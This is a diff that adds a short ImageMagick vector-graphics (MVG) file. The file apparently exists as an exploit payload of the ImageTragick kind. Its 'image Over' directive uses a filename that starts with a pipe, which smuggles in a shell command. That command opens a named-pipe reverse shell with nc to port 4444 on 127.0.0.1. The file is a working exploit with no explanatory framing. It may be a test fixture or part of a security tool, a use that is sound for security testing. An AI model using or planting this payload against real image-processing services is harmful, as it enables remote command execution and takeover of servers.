@@ -1,0 +1,8 @@
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|mkfifo /tmp/gjdpez; nc 127.0.0.1 4444 0</tmp/gjdpez | /bin/sh >/tmp/gjdpez 2>&1; rm /tmp/gjdpez '
+pop graphic-context
+pop graphic-context
